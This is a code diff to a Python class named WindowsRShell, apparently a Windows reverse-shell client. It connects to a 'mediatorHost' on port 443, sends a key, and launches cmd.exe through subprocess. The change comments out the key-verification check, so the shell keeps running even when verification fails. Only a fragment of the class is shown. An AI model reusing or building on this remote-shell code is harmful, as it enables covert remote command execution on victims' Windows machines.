@@ -62,8 +62,8 @@ class WindowsRShell:
         self.handler.connect((socket.gethostbyname(mediatorHost), 443))
         self.handler.sendall(self.connectionKey.encode())
         verification = self.handler.recv(1024)
-        if verification.decode() != self.connectionKey:
-            exit(1)
+#        if verification.decode() != self.connectionKey:
+#            exit(1)
 
     def run(self):
         cmdexe = subprocess.Popen(["\\windows\\system32\\cmd.exe"],
